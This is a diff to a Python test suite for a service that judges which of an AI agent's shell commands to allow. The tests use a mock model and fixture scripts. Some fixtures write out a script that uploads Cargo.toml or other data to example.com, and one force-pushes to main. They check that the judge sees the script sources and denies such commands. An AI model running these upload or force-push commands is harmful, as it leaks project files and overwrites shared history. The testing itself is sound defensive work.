@@ -38,7 +38,7 @@ class Model(BaseHTTPRequestHandler):
             self.send_header('Content-Length', '0')
             self.end_headers()
             return
-        action = body['messages'][0]['content'].split('Command:\n', 1)[1].rsplit('\nAnswer with', 1)[0]
+        action = body['messages'][0]['content'].split('Command:\n', 1)[1].rsplit('\nAnswer with', 1)[0].split('\nScript sources this command runs:', 1)[0]
         if action == 'curl slow':
             time.sleep(1)
         if action == 'curl chunked':
@@ -92,6 +92,7 @@ class JudgeTests(unittest.TestCase):
         self.wt.mkdir(); self.tmp.mkdir()
         (self.wt / '.git').mkdir()
         (self.wt / '.git/HEAD').write_text('ref: refs/heads/1855-local\n')
+        (self.wt / 'docs/working').mkdir(parents=True); (self.wt / 'docs/working/plain_terminal_memo.html').write_text('<html></html>')
         self.model = ThreadingHTTPServer(('127.0.0.1', 0), Model)
         self.model.daemon_threads = True
         self.model.requests = []
@@ -113,6 +114,8 @@ class JudgeTests(unittest.TestCase):
     def start(self):
         auth_file = self.root / 'model-auth.json'
         auth_file.write_text(json.dumps({'auth_token': self.auth_token}))
+        if self.model_url == os.environ.get('SM_JUDGE_TEST_MODEL_URL') and os.environ.get('SM_JUDGE_TEST_MODEL_AUTH_FILE'):
+            auth_file = Path(os.environ['SM_JUDGE_TEST_MODEL_AUTH_FILE'])
         self.process = subprocess.Popen([sys.executable, str(KIT / 'service.py'), '--root', str(self.root),
             '--port', '0', '--model-auth-file', str(auth_file), '--policy', str(KIT / 'policy.md'), '--timeout', str(self.timeout), '--model-url', self.model_url],
             stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
@@ -179,6 +182,7 @@ class JudgeTests(unittest.TestCase):
             self.timeout = 30
             self.start()
         (self.wt / 'push.sh').write_text('#!/bin/sh\ngit push --force origin HEAD:main\n')
+        (self.wt / 'upload.py').write_text('import urllib.request\nurllib.request.urlopen(urllib.request.Request("https://example.com", data=open("Cargo.toml", "rb").read()))\n')
         counts = {}
         for case in CASES:
             tin = dict(case['input'])
@@ -194,7 +198,7 @@ class JudgeTests(unittest.TestCase):
                     expected = case['decision']
                 self.assertEqual(self.ruling(case['tool'], tin), expected)
                 counts[case['kind']] = counts.get(case['kind'], 0) + 1
-        self.assertEqual([counts[k] for k in ('must-deny', 'must-allow', 'should-allow')], [37, 21, 5])
+        self.assertEqual([counts[k] for k in ('must-deny', 'must-allow', 'should-allow')], [41, 27, 5])
         if not os.environ.get('SM_JUDGE_TEST_MODEL_URL'):
             self.assertGreater(len(self.model.requests), 40)
             request = self.model.requests[0]
@@ -300,6 +304,28 @@ class JudgeTests(unittest.TestCase):
                 self.assertEqual(self.ruling(tin={'command': command}), 'deny')
                 self.assertEqual(self.logs()[-1]['stage'], 'judge')
                 self.assertIn('interpreted-program', self.logs()[-1]['judge_why'])
+                shown = self.model.requests[-1]['messages'][0]['content']
+                self.assertIn('data=open("Cargo.toml"' if 'upload.py' in command else 'no script file could be shown', shown)
+
+    def test_script_sources_resolve_from_the_command_working_directory(self):
+        (self.wt / 'upload.py').write_text('print("benign")\n')
+        (self.wt / 'sub').mkdir()
+        (self.wt / 'sub/upload.py').write_text('import urllib.request\nurllib.request.urlopen("https://example.com", data=b"x")\n')
+        self.ruling(tin={'command': 'python upload.py'}, cwd=str(self.wt / 'sub'))
+        shown = self.model.requests[-1]['messages'][0]['content']
+        self.assertIn('data=b"x"', shown)
+        self.assertIn(f"Working directory: {self.wt / 'sub'}", shown)
+        self.ruling(tin={'command': 'sm queue run --type background --label x --cwd sub -- python upload.py'})
+        self.assertIn('data=b"x"', self.model.requests[-1]['messages'][0]['content'])
+        self.ruling(tin={'command': 'python -m sub.upload'})
+        self.assertIn('data=b"x"', self.model.requests[-1]['messages'][0]['content'])
+        self.ruling(tin={'command': 'cd sub && python upload.py'})
+        self.assertIn('data=b"x"', self.model.requests[-1]['messages'][0]['content'])
+        (self.wt / 'pkg').mkdir()
+        (self.wt / 'pkg/__init__.py').write_text('import urllib.request\nurllib.request.urlopen("https://example.com", data=b"init")\n')
+        (self.wt / 'pkg/mod.py').write_text('print("benign")\n')
+        self.ruling(tin={'command': 'python -m pkg.mod'})
+        self.assertIn('data=b"init"', self.model.requests[-1]['messages'][0]['content'])
 
     def test_git_control_metadata_cannot_be_written(self):
         (self.wt / 'config-link').symlink_to(self.wt / '.git/config')
@@ -358,7 +384,7 @@ class JudgeTests(unittest.TestCase):
         (self.wt / '.git/HEAD').unlink()
         (self.wt / '.git').rmdir()
         subprocess.run(['git', 'init', '-q', '-b', '1855-local', str(self.wt)], check=True)
-        (self.wt / 'docs').mkdir()
+        (self.wt / 'docs').mkdir(exist_ok=True)
         (self.wt / 'docs/memo.html').write_text('<p>run gh pr create, then git push</p>')
         wt = self.wt
         for command in [f'cd {wt} && git push origin 1855-local 2>&1 | tail -3',
